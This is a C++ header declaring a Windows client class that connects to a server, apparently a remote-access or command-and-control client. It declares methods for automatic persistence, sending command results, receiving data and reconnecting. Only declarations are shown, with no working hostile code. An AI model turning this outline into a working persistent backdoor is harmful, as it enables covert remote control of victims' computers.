#ifndef CONNEXION_H
#define CONNEXION_H

#include "../inc/master.h" //Include master header file.

using namespace std;

class Connexion
{
    public:
        Connexion(); //Default constructor.

        INT openConnexion(); //Function to connect to the server or re-connect to the server.

        VOID setToken(wstring token); //Function to set the token.
        VOID setIsAdmin(BOOL is_admin);// Function to set whether the client is an admin or not.
        VOID setPathProg(wstring path_prog); // Function to set the path to the program.
        INT setAutoPeristence(); //Function to set automatic persistence.

        INT main(); //Main function of the client.
        VOID sendSafe(vector<string> result_of_command); //Function to send data and manage errors.
        wstring recvSafe(); //Function to receive data and manage possible errors, and return result.
        VOID checkSend(INT &iResult); //Function to check if the send operation was successful.

        VOID reConnect(); //Function to re-connect to the server in case of problems.
        VOID closeConnexion(); //Function to close the connection.

        SOCKET getSocket(); //Getter function for the socket.

    private:
        SOCKET sock_client; //The client socket.
        wstring a_token; //The token.
        BOOL a_is_admin; //Whether the client is an admin or not.
        wstring a_path_prog; //The path to the program.
};
#endif
